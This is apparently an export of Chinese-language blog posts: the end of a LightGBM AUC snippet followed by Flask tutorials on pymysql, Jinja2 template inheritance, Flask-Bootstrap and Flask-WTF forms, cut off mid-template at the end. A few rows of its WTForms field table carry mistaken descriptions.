<li>auc<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> roc_auc_score</span><br><span class="line"><span class="comment"># 根据validation的auc评价调整参数</span></span><br><span class="line">auc_lgbm = roc_auc_score(y_val, y)</span><br><span class="line">print(auc_lgbm)</span><br><span class="line">auc_lgbm_t = roc_auc_score(y_test, y)</span><br><span class="line">print(auc_lgbm_t)</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p><img src="/img/loading.gif" class="lazyload" data-src="http://static.zybuluo.com/LittleFairyDoesntLoseHair/025c2arb9p2cl7zobvidr2os/image_1dr4o2cvk1qlb1sb415vk12tf2809.png"  alt="image_1dr4o2cvk1qlb1sb415vk12tf2809.png-232.8kB"><br><img src="/img/loading.gif" class="lazyload" data-src="http://static.zybuluo.com/LittleFairyDoesntLoseHair/7d06ip8oqn0p4wh2lvexb1yb/image_1dr4ocqmb1fso4tc1c4t7ad1ldcm.png"  alt="image_1dr4ocqmb1fso4tc1c4t7ad1ldcm.png-210.7kB"></p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>机器学习</tag>
        <tag>Lightgbm</tag>
      </tags>
  </entry>
  <entry>
    <title>Flask学习教程三</title>
    <url>/2020/04/24/Flask%E6%95%99%E7%A8%8B%E4%B8%89/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="pymysql"><a href="#pymysql" class="headerlink" title="pymysql"></a>pymysql</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install pymysql</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 导入pymysql模块</span></span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 连接database</span></span><br><span class="line">conn = pymysql.connect(</span><br><span class="line">    host=“你的数据库地址”,</span><br><span class="line">    user=“用户名”,password=“密码”,</span><br><span class="line">    database=“数据库名”,</span><br><span class="line">    charset=“utf8”)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 得到一个可以执行SQL语句的光标对象</span></span><br><span class="line">cursor = conn.cursor()  <span class="comment"># 执行完毕返回的结果集默认以元组显示</span></span><br><span class="line"><span class="comment"># 得到一个可以执行SQL语句并且将结果作为字典返回的游标</span></span><br><span class="line"><span class="comment">#cursor = conn.cursor(cursor=pymysql.cursors.DictCursor)</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 定义要执行的SQL语句</span></span><br><span class="line">sql = <span class="string">"""</span></span><br><span class="line"><span class="string">CREATE TABLE USER1 (</span></span><br><span class="line"><span class="string">id INT auto_increment PRIMARY KEY ,</span></span><br><span class="line"><span class="string">name CHAR(10) NOT NULL UNIQUE,</span></span><br><span class="line"><span class="string">age TINYINT NOT NULL</span></span><br><span class="line"><span class="string">)ENGINE=innodb DEFAULT CHARSET=utf8;  #注意：charset='utf8' 不能写成utf-8</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 执行SQL语句</span></span><br><span class="line">cursor.execute(sql)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 关闭光标对象</span></span><br><span class="line">cursor.close()</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 关闭数据库连接</span></span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>



<h1 id="bootstrap入门和flask-nav快速导航栏"><a href="#bootstrap入门和flask-nav快速导航栏" class="headerlink" title="bootstrap入门和flask_nav快速导航栏"></a>bootstrap入门和flask_nav快速导航栏</h1><blockquote>
<p> 转载自：<a href="https://www.cnblogs.com/wongbingming/p/6813221.html" target="_blank" rel="noopener">https://www.cnblogs.com/wongbingming/p/6813221.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Flask</category>
      </categories>
      <tags>
        <tag>Flask</tag>
      </tags>
  </entry>
  <entry>
    <title>Flask学习教程二——web表单详解</title>
    <url>/2020/04/24/Flask%E6%95%99%E7%A8%8B%E4%BA%8C/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="2-1-应用的基本结构"><a href="#2-1-应用的基本结构" class="headerlink" title="2.1 应用的基本结构"></a>2.1 应用的基本结构</h2><h1 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h1><h1 id="二、应用的基本结构"><a href="#二、应用的基本结构" class="headerlink" title="二、应用的基本结构"></a>二、应用的基本结构</h1><p>处理URL和函数之间关系的程序成为路由</p>
<h1 id="三、模板"><a href="#三、模板" class="headerlink" title="三、模板"></a>三、模板</h1><h2 id="模板继承"><a href="#模板继承" class="headerlink" title="模板继承"></a>模板继承</h2><h3 id="1-base-html"><a href="#1-base-html" class="headerlink" title="1. base.html"></a>1. base.html</h3><p>Jinja2使用block和endblock指令在基模板中定义内容区块，定义了三个block：head、title和body，且title包含在head中</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    &#123;% block head %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;% block title %&#125;&#123;% endblock %&#125; - My Application<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    &#123;% block body %&#125;</span><br><span class="line">    &#123;% endblock %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="2-衍生模板"><a href="#2-衍生模板" class="headerlink" title="2. 衍生模板"></a>2. 衍生模板</h3><p>调用super()，引用基模板中同名区块里的内容</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% extends "base.html" %&#125;</span><br><span class="line">&#123;% block title %&#125;Index&#123;% endblock %&#125;</span><br><span class="line">&#123;% block head %&#125;</span><br><span class="line">    &#123;&#123; super() &#125;&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line">&#123;% block body %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, world!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&#123;% endblock%&#125;</span><br></pre></td></tr></table></figure>

<h3 id="样例"><a href="#样例" class="headerlink" title="样例"></a>样例</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">bootstrap = Bootstrap(app)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/&lt;name&gt;")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"user.html"</span>,name=name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    app.debug=<span class="literal">True</span></span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<p>在setting/project structure中add flask_bootstrap的路径<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/04/24/Flask%E6%95%99%E7%A8%8B%E4%BA%8C/E:%5Cblog%5Chexo%5Csource_posts%5CFlask%E6%95%99%E7%A8%8B%E4%BA%8C.assets%5Cimage-20200428130849333.png"  alt="image-20200428130849333"></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% extends "bootstrap/base.html" %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block title %&#125;Flasky&#123;% endblock %&#125;</span><br><span class="line">&#123;% block navbar %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"navbar navbar-inverse"</span> <span class="attr">role</span>=<span class="string">"navigation"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"navbar-header"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"navbar-toggle"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">data-toggle</span>=<span class="string">"collapse"</span> <span class="attr">data-target</span>=<span class="string">".navbar-collapse"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"sr-only"</span>&gt;</span>Toggle navigation<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"icon-bar"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"icon-bar"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"icon-bar"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"navbar-brand"</span> <span class="attr">href</span>=<span class="string">"/"</span>&gt;</span>Flasky<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"navbar-collapse collapse"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"nav navbar-nav"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/"</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"page-header"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello,&#123;&#123; name &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/04/24/Flask%E6%95%99%E7%A8%8B%E4%BA%8C/blog\hexo\source\_posts\Flask教程二.assets\image-20200428130957457.png"  alt="image-20200428130957457" style="zoom:50%;">



<h2 id="自定义错误页面"><a href="#自定义错误页面" class="headerlink" title="自定义错误页面"></a>自定义错误页面</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.errorhandler(404)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span><span class="params">(e)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> render_template(<span class="string">'404.html'</span>),<span class="number">404</span></span><br><span class="line">	</span><br><span class="line"><span class="meta">@app.errorhandler(500)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">internal_server_error</span><span class="params">(e)</span>:</span></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">'500.html'</span>),<span class="number">500</span></span><br></pre></td></tr></table></figure>

<h3 id="简化模板继承"><a href="#简化模板继承" class="headerlink" title="简化模板继承"></a>简化模板继承</h3><p>base.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% extends "bootstrap/base.html" %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block title %&#125;Flasky&#123;% endblock %&#125;</span><br><span class="line">&#123;% block navbar %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"navbar navbar-inverse"</span> <span class="attr">role</span>=<span class="string">"navigation"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"navbar-header"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"navbar-toggle"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">data-toggle</span>=<span class="string">"collapse"</span> <span class="attr">data-target</span>=<span class="string">".navbar-collapse"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"sr-only"</span>&gt;</span>Toggle navigation<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"icon-bar"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"icon-bar"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"icon-bar"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"navbar-brand"</span> <span class="attr">href</span>=<span class="string">"/"</span>&gt;</span>Flasky<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"navbar-collapse collapse"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"nav navbar-nav"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/"</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"page-header"</span>&gt;</span></span><br><span class="line">        &#123;% block page_content %&#125;&#123;% endblock %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>

<p>404.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% extends "base.html" %&#125;</span><br><span class="line">&#123;% block title %&#125;Flasky - Page Not Found&#123;% endblock %&#125;</span><br><span class="line">&#123;% block page_content %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"page-header"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Not Found<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>

<p>user.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% extends "base.html" %&#125;</span><br><span class="line">&#123;% block title %&#125;Flasky - Page Not Found&#123;% endblock %&#125;</span><br><span class="line">&#123;% block page_content %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"page-header"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, &#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>

<p>统一页面，简化继承</p>
<h1 id="四、"><a href="#四、" class="headerlink" title="四、"></a>四、</h1><p>模板只能使信息从服务器流向用户，而由HTML创建的Web表单可以将用户填写的信息提交给服务器，通常使用POST请求，并通过request.form访问</p>
<p>Flask-WTF拓展把处理web表单的过程进行集成</p>
<h2 id="4-1-配置"><a href="#4-1-配置" class="headerlink" title="4.1 配置"></a>4.1 配置</h2><p>配置密钥，Flask-WTF根据密钥生成加密签名，防止表单遭到跨站请求伪造（CSRF，cross-site request forgery)攻击。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 配置Flask-WTF</span></span><br><span class="line">app=Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>]=<span class="string">'hard to guess string'</span></span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 4.2 表单类</span><br><span class="line"></span><br><span class="line">Web表单继承自FlaskForm类，验证函数&#96;&#96;&#96;validators&#96;&#96;&#96;用于验证用户提交的数据是否有效</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;python</span><br><span class="line"># 定义表单类</span><br><span class="line">from flask_wtf import FlaskForm</span><br><span class="line">from wtforms import StringField, SubmitField</span><br><span class="line">from wtforms.validators import DataRequired</span><br><span class="line"></span><br><span class="line">class NameForm(FlaskForm): # 含有文本字段name和提交按钮submit</span><br><span class="line">    name &#x3D; StringField(&#39;What is your name?&#39;, validators&#x3D;[DataRequired()])</span><br><span class="line">    submit &#x3D; SubmitField(&#39;Submit&#39;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 表1：WTForms支持的HTML标准字段</span><br><span class="line"></span><br><span class="line">| 字段对象 | 说明 |</span><br><span class="line">| -------- | ---- |</span><br><span class="line">| BooleanField      | 复选框，值为True和False             |</span><br><span class="line">| DateField         | 文本字段，值为datetime.date格式     |</span><br><span class="line">| DateTimeField     | 文本字段，值为datetime.datetime格式 |</span><br><span class="line">|     FileField     | 文本字段，值为decima.Decimal格式    |</span><br><span class="line">|FileField|文本上传字段|</span><br><span class="line">| HiddenField       | 隐藏的文本字段 |</span><br><span class="line">| MultipleFileField | 多文件上传字段 |</span><br><span class="line">| FieldList         | 一组指定类型的字段 |</span><br><span class="line">| FloatField        | 文本字段，值为浮点数 |</span><br><span class="line">| FormField         | 把一个表单作为字段嵌入另一个表单 |</span><br><span class="line">| IntegerField      | 文本字段，值为整数 |</span><br><span class="line">| PasswordField     | 密码文本字段 |</span><br><span class="line">| RadioField        | 一组单选按钮 |</span><br><span class="line">| SelectField       | 下拉列表 |</span><br><span class="line">| SelectField       | 下拉列表，可选择多个值 |</span><br><span class="line">| SelectMultipleField | 表单提交按钮 |</span><br><span class="line">| StringField       | 文本字段 |</span><br><span class="line">| TextAreaField     | 多行文本字段 |</span><br><span class="line"></span><br><span class="line">### 表2：WTForms验证函数</span><br><span class="line"></span><br><span class="line">| 验证函数      | 说明                                                   |</span><br><span class="line">| ------------- | ------------------------------------------------------ |</span><br><span class="line">| DataRequired  | 确保转换类型后字段中有数据                             |</span><br><span class="line">| Email         | 验证电子邮件地址                                       |</span><br><span class="line">| EqualTo       | 比较两个字段的值；常用于要求输入两次密码进行确认的情况 |</span><br><span class="line">| InputRequired | 确保转换类型前字段中由数据                             |</span><br><span class="line">| IPAddress     | 验证IPv4网络地址                                       |</span><br><span class="line">| Length        | 验证输入字符串的长度                                   |</span><br><span class="line">| MacAddress    | 验证MAC地址                                            |</span><br><span class="line">| NumberRange   | 验证输入的值在数字范围之内                             |</span><br><span class="line">| Optional      | 允许字段中没有输入，将跳过其他验证函数                 |</span><br><span class="line">| Regexp        | 使用正则表达式验证输入值                               |</span><br><span class="line">| URL           | 验证URL                                                |</span><br><span class="line">| UUID          | 验证UUID                                               |</span><br><span class="line">| AnyOf         | 确保输入值在一组可能的值中                             |</span><br><span class="line">| NoneOf        | 确保输入值不在一组可能的值中                           |</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 4.3 把表单渲染成HTML</span><br><span class="line"></span><br><span class="line">表单字段可以调用，调用后会渲染成HTML。</span><br><span class="line"></span><br><span class="line">假设视图函数通过form参数把一个NameForm实例传入模板，在模板中可以生成一个简单的HTML表单</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;html</span><br><span class="line">&lt;form method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">    &lt;!--生成一个隐藏字段，供Flask-WTF的CRSF防护机制使用--&gt;</span><br><span class="line">    &#123;&#123; form.hidden_tag() &#125;&#125; </span><br><span class="line">    &#123;&#123; form.name.label &#125;&#125;&#123;&#123; form.name() &#125;&#125;</span><br><span class="line">    &#123;&#123; form.submit() &#125;&#125;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>

<p>为字段指定id或class属性，定义CSS样式</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;&#123;form.name(id='my-text-field')&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>templates/index.html：使用Flask-WTF和Flask-Bootstrap渲染表单</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% extends "base.html" %&#125;</span><br><span class="line">&#123;% import "bootstrap/wtf.html" as wtf %&#125; --导入模板元素</span><br><span class="line">&#123;% block title %&#125;Flasky&#123;% endblock %&#125;</span><br><span class="line">&#123;% block page_content %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"page-header"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello,&#123;% if name %&#125;&#123;&#123; name &#125;&#125;&#123;% else %&#125;Stranger&#123;% endif %&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;&#123; wtf.quick_form(form) &#125;&#125;--参数form为Flask-WTF表单对象，使用Bootstrap的默认样式渲染传入的表单</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>

<h2 id="4-4-在视图函数中处理表单"><a href="#4-4-在视图函数中处理表单" class="headerlink" title="4.4 在视图函数中处理表单"></a>4.4 在视图函数中处理表单</h2><p>完整代码</p>
<p>app.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line"><span class="keyword">from</span> flask_wtf <span class="keyword">import</span> FlaskForm</span><br><span class="line"><span class="keyword">from</span> wtforms <span class="keyword">import</span> StringField, SubmitField</span><br><span class="line"><span class="keyword">from</span> wtforms.validators <span class="keyword">import</span> DataRequired</span><br><span class="line"><span class="keyword">from</span> flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = <span class="string">'hard to guess string'</span></span><br><span class="line">bootstrap = Bootstrap(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义表单类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NameForm</span><span class="params">(FlaskForm)</span>:</span>  <span class="comment"># 含有文本字段name和提交按钮submit</span></span><br><span class="line">    name = StringField(<span class="string">'What is your name?'</span>, validators=[DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">'Submit'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    name = <span class="literal">None</span></span><br><span class="line">    form = NameForm()</span><br><span class="line">    <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">        name = form.name.data</span><br><span class="line">        form.name.data = <span class="string">''</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=form, name=name)</span><br></pre></td></tr></table></figure>

<p>base.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% extends "bootstrap/base.html" %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block title %&#125;Flasky&#123;% endblock %&#125;</span><br><span class="line">&#123;% block navbar %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"navbar navbar-inverse"</span> <span class="attr">role</span>=<span class="string">"navigation"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"navbar-header"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"navbar-toggle"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">data-toggle</span>=<span class="string">"collapse"</span> <span class="attr">data-target</span>=<span class="string">".navbar-collapse"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"sr-only"</span>&gt;</span>Toggle navigation<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"icon-bar"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"icon-bar"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"icon-bar"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"navbar-brand"</span> <span class="attr">href</span>=<span class="string">"/"</span>&gt;</span>Flasky<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"navbar-collapse collapse"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"nav navbar-nav"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/"</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span 